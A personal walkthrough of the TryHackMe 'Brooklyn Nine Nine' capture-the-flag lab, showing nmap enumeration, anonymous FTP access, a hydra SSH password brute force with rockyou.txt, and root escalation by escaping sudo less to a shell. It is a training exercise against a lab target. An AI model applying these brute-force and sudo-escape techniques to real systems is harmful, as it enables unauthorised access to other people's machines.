# Brooklyn Nine Nine

# Joshua Birch | 11th June 2022 | Easy CTF | https://tryhackme.com/room/brooklynninenine

---

This is an easy CTF on TryHackMe, there are two main intended ways to root the box. Here's how I did it.

---

# Information Gathering

First thing first, gathering information on the target (10.10.250.186) for this I used nmap to get a good idea on what ports are open:
```
Nmap 7.92 scan initiated Sat Jun 11 11:47:09 2022 as: nmap -sC -sV -oN nmap/initial 10.10.250.186
Nmap scan report for 10.10.250.186
Host is up (0.035s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.74.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sat Jun 11 11:47:17 2022 -- 1 IP address (1 host up) scanned in 8.39 seconds
```

As we can see ports 21 (ftp), 22 (ssh) & 80 (http) are currently open. What's interesting is that FTP is allowed anonymous login so let's login.

# FTP Login

Once logged in (using anonymous as the username with no password) we can see using ``` ls ``` that there is a .txt file (note_to_jake.txt)

Using the command ``` get ``` I downloaded the file onto my machine and used ```cat``` to read the contents:

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```

This is very useful, it gives us two possbile usernames needed for SSH & most importantly tells us that Jake has a weak password.

With this information, let's get into the system!

# Brute Forcing 

Using ```hydra``` we can bruteforce the password for the user jake to find a password:

```
hydra -l jake -P /usr/share/wordlists/rockyou.txt  10.10.250.186 ssh
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-11 12:02:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.250.186:22/
[22][ssh] host: 10.10.250.186   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-11 12:02:36
```

Great, we have found the password! Next we need to login with ssh:

```
┌──(jy0shi㉿demogorgon)-[~]
└─$ ssh jake@10.10.250.186                                           
The authenticity of host '10.10.250.186 (10.10.250.186)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.250.186' (ED25519) to the list of known hosts.
jake@10.10.250.186's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ 
```

# Finding the user flag

Now that we are on the system let's look around for that user flag!

I went straight to /home to see the users home direcories:

```
jake@brookly_nine_nine:/home$ ls
amy  holt  jake
```

We have three users here. Amy, Jake & holt. Looking at Amy's directory, nothing is found. Let's try holt's:
```
jake@brookly_nine_nine:/home$ cd holt
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt
```
Okay, we have the user.txt file, let's read that with ```cat``` and see what the flag is:
```
jake@brookly_nine_nine:/home/holt$ cat user.txt 
<REDACTED>
```

Okay we have the user flag! (I have redacted it so you can try it yourself :) 

# Privellege Esculation

Let's try and root this box to get the root flag, lets run ```sudo -l``` to search for any exploitation we can use to get root:

```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Perfect! We can see he can run ``` less /usr/bin``` as sudo. So let's exploit that:
```
jake@brookly_nine_nine:~$ sudo less /etc/hosts
root@brookly_nine_nine:~#
```
when you run ```sudo less /etc/hosts``` write ```!bash``` and you now have sudo privelleges!

# Finding the root flag

Finding the root flag is easy:

```
root@brookly_nine_nine:~# cd /root
root@brookly_nine_nine:/root# ls
root.txt
root@brookly_nine_nine:/root# cat root.txt 
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: <REDACTED>
```

I moved into the root directory and listed all files with ```ls``` and there we go, we have root.txt. Read the contents with ```cat``` and the flag is there!

# Closing summary 

I really enjoyed this box - it's good to freshen up on an easy box once in a while.

There are more than one way to get in - this is the way I decided to go.

